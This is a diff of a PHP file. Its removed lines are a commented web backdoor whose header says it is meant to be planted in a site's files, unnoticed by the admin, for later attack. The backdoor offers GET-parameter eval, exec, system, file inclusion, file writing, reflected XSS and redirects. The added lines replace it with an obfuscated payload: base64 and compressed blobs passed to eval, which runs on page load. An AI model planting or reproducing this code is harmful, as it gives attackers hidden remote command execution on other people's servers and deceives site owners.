@@ -1,41 +1,6 @@
 <?php
-/* 
-Coded By: Zech Bron
-Github: https://github.com/ZechBron
-Github Code: https://github.com/ZechBron/Crying-PHP
-Description:
-	Vulnerable PHP Codes to put inside a file (but do not modify that file to avoid the admin discoveringg what you've done) for future attack.
-	Note that the only purpose of this code is to insert this shit in a file to make the site vulnerable for your future attack.
-*/
-// XSS - Redirect, and other stuff
-if (isset($_GET['xzz'])) {
-	echo $_GET['xzz'];
-}
-// Eval
-elseif (isset($_GET['zeval'])) {
-	eval($_GET['zeval']);
-}
-elseif (isset($_GET['zexec'])) {
-	exec($_GET['zexec']);
-}
-// Sys
-elseif (isset($_GET['zsys'])) {
-	system($_GET['zsys']);
-}
-// File Inclusion
-elseif (isset($_GET['zfile'])) {
-	include $_GET['zfile'];	
-}
-// Write File
-elseif (isset($_GET['zfilename']) && isset($_GET['zcontent'])) {
-	$zCh = fopen($_GET['zfilename'], "a");
-	fwrite($zCh, $_GET['zcontent']);
-	fclose($zCh);
-}
-// Header Hacking
-elseif (isset($_GET['zheader'])) {
-	header("Location: " . $_GET['zheader']);
-}
-
-
+$zCh = "ZXZhbCUyOCUyNnF1b3QlM0IlM0YlMjZndCUzQiUyNnF1b3QlM0IuZ3p1bmNvbXByZXNzJTI4Z3p1bmNvbXByZXNzJTI4Z3ppbmZsYXRlJTI4Z3ppbmZsYXRlJTI4Z3ppbmZsYXRlJTI4YmFzZTY0X2RlY29kZSUyOHN0cnJldiUyOCUyNHVrNDUlMjklMjklMjklMjklMjklMjklMjklMjklM0I=";
+$uk45 = "=Mz9b0LON5mh/vb5J7q4HoQYM8xv0Kls+lBM66a9Vx75Yu/1GevgD/OFoYRCunsW9jHLJql0ckg+JgD07LLD7bIGhGIMBmXoddglwfenye3boi2QaFVeh/kTSMAKMG+rAThZXcH5HN4FL+sb5hqOBi+YLwsvaM8rqxSjfAM8HiseV6OWNxfGv3Y8G8TjWaB9vidOHeHKPMckKrzVszBEt7aRwCQ8hHGHFFRv7Z5vRT8XNzTLNjfFy7PGx/e0bbrHN+3XXfzPTKZkvjGknhk4LrzpBisMAPKCJQaoaT1FDzZJL/Rhk8YKnZ/wVOrOZ4O7dzw1MulDibprZNK8BftPSruOfktH3GkDJfAtnnxB9UGXGNcR14oBjCrlPvpsbyLhJueHqqGy6wsh4ADzDiW9xK7gurx84i+NptnSDoWVBEvTrYlNh4TR1VgyBwa6WRpEGvQKOtyJukGkQIUtjj2EVJEyeklbchQFY1pBXYF+0EnZrlWFTXK63Paj4urf9ZW0ueOTqyLABVRPQlmlSfaj6mepfWJRknxqXTZ06ijmOflDlNB8mpGuqUhboJOD0Pqi8uqLv5c6ed+qd/9NpTq21ZjT77vx1dqOGtkasMHpQZsN2YcWGBjZ62sCbf6vNWCOSTIc/D+x/YIEws9ahNZfcin/TEA7BwJe+jQA3Hg/DEA/B0v/CEQA";
+eval(htmlspecialchars_decode(urldecode(base64_decode($zCh))));
+exit;
 ?>
